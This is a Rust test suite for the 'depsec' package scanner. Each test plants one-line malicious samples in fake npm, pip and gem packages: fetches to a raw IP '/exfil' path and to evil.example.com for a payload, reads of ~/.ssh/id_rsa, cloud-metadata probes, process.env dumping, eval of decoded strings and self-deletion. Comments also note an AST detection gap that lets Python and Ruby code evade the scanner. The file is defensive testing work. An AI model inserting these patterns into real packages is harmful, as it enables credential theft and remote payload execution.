//! Scan Tier: Tests that `depsec scan` detects known malicious patterns.
//! Each test creates a package with a specific attack technique and verifies
//! the expected rule fires.

use crate::common::{run_scan, ScanPackageBuilder};
use crate::scorecard::{Actual, Expected, Layer, TestOutcome, VectorResult};

/// Run all scan tier tests and return results for the scorecard
pub fn run_all() -> Vec<VectorResult> {
    let tests: Vec<(&str, &str, &str, Box<dyn Fn() -> bool>)> = vec![
        (
            "P002",
            "hn-base64-eval",
            "DEPSEC-P002",
            Box::new(test_base64_eval),
        ),
        (
            "P003",
            "hn-raw-ip-fetch",
            "DEPSEC-P003",
            Box::new(test_raw_ip_fetch),
        ),
        (
            "P004",
            "hn-credential-read",
            "DEPSEC-P004",
            Box::new(test_credential_read),
        ),
        (
            "P005",
            "hn-stego-payload",
            "DEPSEC-P005",
            Box::new(test_stego_payload),
        ),
        (
            "P006",
            "hn-install-curl",
            "DEPSEC-P006",
            Box::new(test_install_curl),
        ),
        (
            "P008",
            "hn-new-function",
            "DEPSEC-P008",
            Box::new(test_new_function),
        ),
        (
            "P010",
            "hn-imds-probe",
            "DEPSEC-P010",
            Box::new(test_imds_probe),
        ),
        (
            "P011",
            "hn-env-stringify",
            "DEPSEC-P011",
            Box::new(test_env_stringify),
        ),
        (
            "P013",
            "hn-dynamic-require",
            "DEPSEC-P013",
            Box::new(test_dynamic_require),
        ),
        (
            "P014",
            "hn-char-code-xor",
            "DEPSEC-P014",
            Box::new(test_char_code_xor),
        ),
        (
            "P015",
            "hn-self-destruct",
            "DEPSEC-P015",
            Box::new(test_self_destruct),
        ),
        (
            "P017",
            "hn-obfuscated-hex",
            "DEPSEC-P017",
            Box::new(test_obfuscated_hex),
        ),
        (
            "P018",
            "hn-node-binding",
            "DEPSEC-P018",
            Box::new(test_node_binding),
        ),
        ("P019", "hn-vm-exec", "DEPSEC-P019", Box::new(test_vm_exec)),
        (
            "P001-py",
            "hn-python-subprocess",
            "DEPSEC-P001",
            Box::new(test_python_subprocess),
        ),
        (
            "P001-rb",
            "hn-ruby-system",
            "DEPSEC-P001",
            Box::new(test_ruby_system),
        ),
    ];

    tests
        .into_iter()
        .map(|(id, name, rule, test_fn)| {
            let detected = test_fn();
            VectorResult {
                id: id.into(),
                name: name.into(),
                layer: Layer::StaticScan,
                rule_or_technique: rule.into(),
                expected: Expected::Detect,
                actual: if detected {
                    Actual::Detect
                } else {
                    Actual::Miss
                },
                outcome: TestOutcome::from(
                    Expected::Detect,
                    if detected {
                        Actual::Detect
                    } else {
                        Actual::Miss
                    },
                ),
            }
        })
        .collect()
}

// ── Individual scan tests ──

fn scan_detects(name: &str, file: &str, content: &str, rule_id: &str) -> bool {
    let dir = ScanPackageBuilder::npm(name).file(file, content).build();
    let output = run_scan(dir.path(), "patterns");
    output.contains(rule_id)
}

fn scan_detects_pip(name: &str, file: &str, content: &str, rule_id: &str) -> bool {
    let dir = ScanPackageBuilder::pip(name).file(file, content).build();
    let output = run_scan(dir.path(), "patterns");
    output.contains(rule_id)
}

fn scan_detects_gem(name: &str, file: &str, content: &str, rule_id: &str) -> bool {
    let dir = ScanPackageBuilder::gem(name).file(file, content).build();
    let output = run_scan(dir.path(), "patterns");
    output.contains(rule_id)
}

fn test_base64_eval() -> bool {
    scan_detects(
        "hn-base64-eval",
        "index.js",
        "var payload = atob(encoded); eval(payload);",
        "DEPSEC-P002",
    )
}

fn test_raw_ip_fetch() -> bool {
    scan_detects(
        "hn-raw-ip-fetch",
        "index.js",
        r#"fetch("http://93.184.216.34:8080/exfil");"#,
        "DEPSEC-P003",
    )
}

fn test_credential_read() -> bool {
    scan_detects(
        "hn-credential-read",
        "index.js",
        r#"const key = readFile("~/.ssh/id_rsa");"#,
        "DEPSEC-P004",
    )
}

fn test_stego_payload() -> bool {
    // P005: readFileSync on a binary media file
    let dir = ScanPackageBuilder::npm("hn-stego-payload")
        .file("index.js", r#"const data = readFileSync("payload.png");"#)
        .file("payload.png", "fake-png-content")
        .build();
    let output = run_scan(dir.path(), "patterns");
    output.contains("DEPSEC-P005")
}

fn test_install_curl() -> bool {
    // P006: curl/wget/fetch calls in install scripts
    // The regex requires function-call syntax: curl(...) or fetch(...)
    scan_detects(
        "hn-install-curl",
        "postinstall.sh",
        r#"fetch("http://evil.example.com/payload.sh")"#,
        "DEPSEC-P006",
    )
}

fn test_new_function() -> bool {
    scan_detects(
        "hn-new-function",
        "index.js",
        "const fn = new Function(userInput); fn();",
        "DEPSEC-P008",
    )
}

fn test_imds_probe() -> bool {
    scan_detects(
        "hn-imds-probe",
        "index.js",
        r#"fetch("http://169.254.169.254/latest/meta-data/iam/");"#,
        "DEPSEC-P010",
    )
}

fn test_env_stringify() -> bool {
    scan_detects(
        "hn-env-stringify",
        "index.js",
        "const envData = JSON.stringify(process.env);",
        "DEPSEC-P011",
    )
}

fn test_dynamic_require() -> bool {
    scan_detects(
        "hn-dynamic-require",
        "index.js",
        "const mod = require(packageName);",
        "DEPSEC-P013",
    )
}

fn test_char_code_xor() -> bool {
    // P014: String.fromCharCode with XOR
    scan_detects(
        "hn-char-code-xor",
        "index.js",
        r#"
        var key = 42;
        var decoded = "";
        for (var i = 0; i < data.length; i++) {
            decoded += String.fromCharCode(data.charCodeAt(i) ^ key);
        }
        "#,
        "DEPSEC-P014",
    )
}

fn test_self_destruct() -> bool {
    scan_detects(
        "hn-self-destruct",
        "index.js",
        r#"fs.unlinkSync(__filename);"#,
        "DEPSEC-P015",
    )
}

fn test_obfuscated_hex() -> bool {
    scan_detects(
        "hn-obfuscated-hex",
        "index.js",
        r#"function _0x4a2b(){while(!![]){try{return true;}catch(e){}}}"#,
        "DEPSEC-P017",
    )
}

fn test_node_binding() -> bool {
    scan_detects(
        "hn-node-binding",
        "index.js",
        r#"const spawn = process.binding('spawn_sync');"#,
        "DEPSEC-P018",
    )
}

fn test_vm_exec() -> bool {
    scan_detects(
        "hn-vm-exec",
        "index.js",
        r#"const result = vm.runInNewContext(untrustedCode);"#,
        "DEPSEC-P019",
    )
}

fn test_python_subprocess() -> bool {
    // Python: exec() with variable input triggers P001 regex
    // NOTE: Python AST (P021) is NOT triggered by integration scanner because
    // needs_ast gate only checks JS keywords. This is a known depsec gap tracked
    // as evasion vector. Here we test the regex fallback.
    scan_detects_pip(
        "hn-python-subprocess",
        "__init__.py",
        "import os\nos.system(cmd)\nexec(malicious_code)",
        "DEPSEC-P001", // regex catches exec(variable)
    )
}

fn test_ruby_system() -> bool {
    // Ruby: eval() with variable input triggers P001 regex
    // NOTE: Ruby AST (P031) is NOT triggered by integration scanner because
    // needs_ast gate only checks JS keywords. This is a known depsec gap.
    scan_detects_gem(
        "hn-ruby-system",
        "lib/evil.rb",
        "eval(user_input)",
        "DEPSEC-P001", // regex catches eval(variable)
    )
}

// ── Standard test functions for cargo test ──

#[test]
fn scan_tier_base64_eval() {
    assert!(
        test_base64_eval(),
        "P002: base64 decode → eval chain should be detected"
    );
}

#[test]
fn scan_tier_raw_ip_fetch() {
    assert!(
        test_raw_ip_fetch(),
        "P003: HTTP call to raw IP should be detected"
    );
}

#[test]
fn scan_tier_credential_read() {
    assert!(
        test_credential_read(),
        "P004: readFile targeting ~/.ssh should be detected"
    );
}

#[test]
fn scan_tier_stego_payload() {
    assert!(
        test_stego_payload(),
        "P005: readFileSync on .png should be detected"
    );
}

#[test]
fn scan_tier_install_curl() {
    assert!(
        test_install_curl(),
        "P006: curl in install script should be detected"
    );
}

#[test]
fn scan_tier_new_function() {
    assert!(
        test_new_function(),
        "P008: new Function(variable) should be detected"
    );
}

#[test]
fn scan_tier_imds_probe() {
    assert!(
        test_imds_probe(),
        "P010: 169.254.169.254 access should be detected"
    );
}

#[test]
fn scan_tier_env_stringify() {
    assert!(
        test_env_stringify(),
        "P011: JSON.stringify(process.env) should be detected"
    );
}

#[test]
fn scan_tier_dynamic_require() {
    assert!(
        test_dynamic_require(),
        "P013: require(variable) should be detected"
    );
}

#[test]
fn scan_tier_char_code_xor() {
    assert!(
        test_char_code_xor(),
        "P014: String.fromCharCode + XOR should be detected"
    );
}

#[test]
fn scan_tier_self_destruct() {
    assert!(
        test_self_destruct(),
        "P015: unlinkSync(__filename) should be detected"
    );
}

#[test]
fn scan_tier_obfuscated_hex() {
    assert!(
        test_obfuscated_hex(),
        "P017: _0x hex identifiers + while(!![]) should be detected"
    );
}

#[test]
fn scan_tier_node_binding() {
    assert!(
        test_node_binding(),
        "P018: process.binding() should be detected"
    );
}

#[test]
fn scan_tier_vm_exec() {
    assert!(
        test_vm_exec(),
        "P019: vm.runInNewContext should be detected"
    );
}

#[test]
fn scan_tier_python_subprocess() {
    assert!(
        test_python_subprocess(),
        "P001: exec(variable) in Python should be detected via regex"
    );
}

#[test]
fn scan_tier_ruby_system() {
    assert!(
        test_ruby_system(),
        "P001: eval(variable) in Ruby should be detected via regex"
    );
}
